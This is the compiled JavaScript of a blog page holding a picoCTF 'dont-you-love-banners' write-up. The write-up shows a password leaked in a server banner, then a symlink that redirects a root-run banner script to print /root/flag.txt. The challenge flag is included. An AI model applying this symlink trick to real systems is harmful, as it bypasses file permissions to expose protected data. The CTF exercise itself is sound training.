"use strict";(self.webpackChunkmy_own_blog=self.webpackChunkmy_own_blog||[]).push([[7939],{4513:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>i});const s=JSON.parse('{"id":"pico-ctf/general-skills/dont-you-love-banners","title":"dont-you-love-banners","description":"- Description: Can you abuse the banner?","source":"@site/docs/pico-ctf/general-skills/dont-you-love-banners.mdx","sourceDirName":"pico-ctf/general-skills","slug":"/pico-ctf/general-skills/dont-you-love-banners","permalink":"/my-small-blog/docs/pico-ctf/general-skills/dont-you-love-banners","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"tags":[]},"sidebar":"tutorialSidebar","previous":{"title":"convertme.py","permalink":"/my-small-blog/docs/pico-ctf/general-skills/convertme"},"next":{"title":"endianness","permalink":"/my-small-blog/docs/pico-ctf/general-skills/endianness"}}');var t=r(4848),l=r(8453);const a={tags:[]},o="dont-you-love-banners",c={},i=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",br:"br",code:"code",em:"em",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"dont-you-love-banners",children:"dont-you-love-banners"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Description:"})," Can you abuse the banner?"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Difficulty:"})," Medium"]}),"\n"]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,t.jsxs)(n.p,{children:["The first server contains leaked information. Upon connecting, we discover the password: ",(0,t.jsx)(n.code,{children:"My_Passw@rd_@1234"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"> nc tethys.picoctf.net 53058\r\nSSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234\n"})}),"\n",(0,t.jsx)(n.p,{children:"Next, we connect to the second server.\r\nHere, we are prompted with a series of questions.\r\nAnswering them correctly grants us shell access, allowing us to execute commands."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"what is the password? \r\nMy_Passw@rd_@1234\r\nWhat is the top cyber security conference in the world?\r\nDEF CON\r\nthe first hacker ever was known for phreaking(making free phone calls), who was it?\r\nJohn Draper\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Running ",(0,t.jsx)(n.code,{children:"ls"})," in the home directory ",(0,t.jsx)(n.code,{children:"~"}),", we find 2 files: ",(0,t.jsx)(n.code,{children:"banner"})," and ",(0,t.jsx)(n.code,{children:"text"}),".\r\nUpon inspection, neither file appears to contain the flag."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"player@challenge:~$ ls\r\nls\r\nbanner  text\r\nplayer@challenge:~$ cat banner\r\ncat banner\r\n*************************************\r\n**************WELCOME****************\r\n*************************************\r\nplayer@challenge:~$ cat text\r\ncat text\r\nkeep digging\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Navigating to the ",(0,t.jsx)(n.code,{children:"/root"})," directory, we discover 2 files: ",(0,t.jsx)(n.code,{children:"flag.txt"})," and ",(0,t.jsx)(n.code,{children:"script.py"}),".\r\nHowever, we don't have the necessary permissions to read ",(0,t.jsx)(n.code,{children:"flag.txt"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"player@challenge:/root$ ls\r\nls\r\nflag.txt  script.py\r\nplayer@challenge:/root$ cat flag.txt    \r\ncat flag.txt\r\ncat: flag.txt: Permission denied\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Examining ",(0,t.jsx)(n.code,{children:"script.py"}),", we learn that it is responsible for displaying the server's welcome message upon user connection.\r\nSpecifically, it reads and prints the contents of ",(0,t.jsx)(n.code,{children:"/home/player/banner"}),", which we've already seen."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:' try:\r\n      with open("/home/player/banner", "r") as f:\r\n        print(f.read())\r\n    except:\r\n      print("*********************************************")\r\n      print("***************DEFAULT BANNER****************")\r\n      print("*Please supply banner in /home/player/banner*")\r\n      print("*********************************************")\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Since we cannot read ",(0,t.jsx)(n.code,{children:"flag.txt"})," directly due to permission restrictions, we consider using a ",(0,t.jsx)(n.strong,{children:(0,t.jsx)(n.a,{href:"https://www.geeksforgeeks.org/how-to-symlink-a-file-in-linux/",children:"symbolic link"})})," (",(0,t.jsx)(n.em,{children:"symlink"}),").\r\nA symlink is a special type of file that acts as a reference or shortcut to another file or directory.",(0,t.jsx)(n.br,{}),"\n","To exploit this, we delete the original banner file and create a symlink that points to ",(0,t.jsx)(n.code,{children:"/root/flag.txt"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"player@challenge:~$ rm -rf banner\r\nrm -rf banner\r\nplayer@challenge:~$ ln -s /root/flag.txt banner\r\nln -s /root/flag.txt banner\r\nplayer@challenge:~$ ls\r\nls\r\nbanner  text\n"})}),"\n",(0,t.jsxs)(n.p,{children:["This command creates a symbolic link named banner that redirects to the restricted ",(0,t.jsx)(n.code,{children:"flag.txt"}),".",(0,t.jsx)(n.br,{}),"\n","Now, when a user connects to the server again, ",(0,t.jsx)(n.code,{children:"script.py"})," reads the new banner - which is actually a symlink to ",(0,t.jsx)(n.code,{children:"flag.txt"}),".\r\nAs a result, the contents of the flag are displayed on connection, successfully revealing the flag."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"> nc tethys.picoctf.net 55013\r\npicoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>o});var s=r(6540);const t={},l=s.createContext(t);function a(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);